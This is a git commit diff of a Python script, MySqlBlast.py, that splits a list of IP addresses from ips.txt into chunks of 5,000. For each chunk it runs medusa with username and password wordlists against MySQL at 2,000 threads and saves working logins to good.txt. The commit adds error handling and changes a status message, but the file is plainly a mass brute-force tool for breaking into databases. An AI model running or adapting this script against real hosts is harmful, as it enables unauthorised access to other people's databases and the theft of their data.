8b8a21e21191cc886e696db7bb4f9e9b39042892
xiaohuimc <xiaohuimc@hotmail.com>
2018-08-26 12:20:34 +0800

    2018-8-26 12:20:28
    2018-8-26 12:20:28

--- MySqlBlast.py
+++ MySqlBlast.py
@@ -5,24 +5,27 @@ import subprocess
 
 def Segmentation(): #分割txt
 
-    with open("ips.txt",'r') as file:
-        i=0
-        j=0
-        for ips in file:
-            if i<=5000:
-                f=open("iplist"+str(j)+".txt",'a+')
-                f.write(ips)
-                i+=1
-            else:
-                Blast("iplist"+str(j)+".txt")
-                i=0
-                j+=1
+    try:
+        with open("ips.txt",'r') as file:
+            i=0
+            j=0
+            for ips in file:
+                if i<=5000:
+                    f=open("iplist"+str(j)+".txt",'a+')
+                    f.write(ips)
+                    i+=1
+                else:
+                    Blast("iplist"+str(j)+".txt")
+                    i=0
+                    j+=1
+    except IOError:
+        print("Check if ips.txt exists !")
 
 def Blast(fileNames):#爆破
 
     subprocess.call("medusa -H "+fileNames+" -U user.txt -P pass.txt -M mysql -T 2000 -O good.txt", shell=True)
     os.remove(fileNames)
-    print(u"Done")
+    print(u"Blasting has been completed")
 
 def run():
 
@@ -37,6 +40,7 @@ def run():
 
     
     """)
+
     Segmentation()
 
 
